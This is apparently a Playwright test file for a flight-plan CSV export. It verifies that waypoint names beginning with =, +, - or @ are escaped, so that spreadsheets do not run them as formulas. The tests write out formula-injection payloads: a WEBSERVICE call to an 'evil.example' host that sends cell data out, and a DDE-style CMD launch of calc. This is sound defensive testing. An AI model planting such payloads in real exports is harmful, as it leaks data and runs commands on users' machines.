// @ts-check
// A waypoint name is attacker-supplied: it arrives from an imported route file or a shared
// link and is only ever checked for being a string. A spreadsheet evaluates any cell that
// opens with =, +, - or @, so a name like =WEBSERVICE("https://evil/?x="&A1) used to become a
// live formula the moment the pilot opened the exported flight plan — CSV quoting does not
// stop it, because the formula runs inside the quotes.
const { test, expect } = require('./_setup');
const { clickToolbarControl } = require('./_toolbar');

async function downloadText(download) {
  const stream = await download.createReadStream();
  const chunks = [];
  for await (const chunk of stream) chunks.push(chunk);
  return Buffer.concat(chunks).toString('utf8');
}

async function csvFor(page, names) {
  await page.goto('?lang=en&nogist');
  await page.waitForFunction(() => typeof showFlightPlan === 'function' && typeof syncLegs === 'function');
  await page.evaluate((wpNames) => {
    state.waypoints = wpNames.map((name, i) => ({ lat: 32.10 + i * 0.12, lng: 34.80 + i * 0.05, name }));
    state.legs = []; syncLegs(); state.legs.forEach(l => l.flightSpeed = 110);
    state.selected = null; draw();
  }, names);
  await clickToolbarControl(page, '#plan');
  const modal = page.locator('.modal-back.flight-plan');
  await expect(modal).toBeVisible();
  const downloadPromise = page.waitForEvent('download');
  await modal.locator('.modal-btns button', { hasText: 'CSV' }).click();
  return downloadText(await downloadPromise);
}

test('a formula-leading waypoint name is exported as text, not as a formula', async ({ page }) => {
  const csv = await csvFor(page, ['=WEBSERVICE("https://evil.example/?x="&A1)', 'BRAVO']);
  // Present in the file — the pilot still sees the name they gave the point...
  expect(csv).toContain('WEBSERVICE');
  // ...but never at the start of a cell, where a spreadsheet would run it.
  for (const line of csv.split('\r\n')) {
    for (const cell of line.split(',')) {
      expect(cell.replace(/^"/, '').startsWith('=')).toBe(false);
    }
  }
  expect(csv).toContain('\'=WEBSERVICE');
});

for (const lead of ['+', '-', '@']) {
  test(`a name starting with ${lead} is neutralised too`, async ({ page }) => {
    const csv = await csvFor(page, [`${lead}CMD|'/c calc'!A0`, 'BRAVO']);
    expect(csv).toContain(`'${lead}CMD`);
  });
}

test('numbers keep their meaning — a negative value is not turned into text', async ({ page }) => {
  const csv = await csvFor(page, ['ALPHA', 'BRAVO']);
  // Headings, times and altitudes fill the sheet; none of them may pick up an apostrophe.
  const cells = csv.split('\r\n').flatMap(l => l.split(','));
  const numeric = cells.filter(c => /^'?[-+]?\d+(\.\d+)?$/.test(c));
  expect(numeric.length).toBeGreaterThan(0);
  expect(numeric.filter(c => c.startsWith("'"))).toEqual([]);
});
